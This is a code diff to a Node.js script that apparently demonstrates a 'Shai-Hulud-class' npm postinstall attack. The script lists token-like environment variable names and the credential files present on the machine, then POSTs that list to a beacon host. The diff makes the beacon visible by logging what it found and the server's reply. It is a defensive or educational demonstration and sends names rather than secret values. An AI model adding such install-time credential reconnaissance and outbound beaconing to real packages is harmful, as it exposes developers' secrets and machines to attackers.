@@ -45,14 +45,31 @@ const payload = JSON.stringify({
   // NOTE: deliberately NOT sending values — this is a behavioral demo, not exfiltration.
 });
 
-const req = https.request({
-  host: BEACON_HOST,
-  path: BEACON_PATH,
-  method: "POST",
-  headers: { "content-type": "application/json", "content-length": payload.length },
-  timeout: 3000,
-}, () => {});
-req.on("error", () => {});
-req.on("timeout", () => req.destroy());
-req.write(payload);
-req.end();
+console.log("[demo] simulating Shai-Hulud-class postinstall");
+console.log("[demo] token-shaped env keys observed:", tokenEnvKeys.length);
+console.log("[demo] credential paths present:", presentCreds);
+console.log("[demo] beaconing to https://" + BEACON_HOST + BEACON_PATH);
+
+// Synchronous-ish wait: keep the event loop alive until the request resolves.
+const done = new Promise(resolve => {
+  const req = https.request({
+    host: BEACON_HOST,
+    path: BEACON_PATH,
+    method: "POST",
+    headers: { "content-type": "application/json", "content-length": Buffer.byteLength(payload) },
+    timeout: 8000,
+  }, res => {
+    let body = "";
+    res.on("data", c => body += c);
+    res.on("end", () => {
+      console.log("[demo] beacon response:", res.statusCode, body.slice(0, 80));
+      resolve();
+    });
+  });
+  req.on("error", e => { console.log("[demo] beacon error:", e.message); resolve(); });
+  req.on("timeout", () => { console.log("[demo] beacon timeout"); req.destroy(); resolve(); });
+  req.write(payload);
+  req.end();
+});
+
+done.then(() => console.log("[demo] done"));
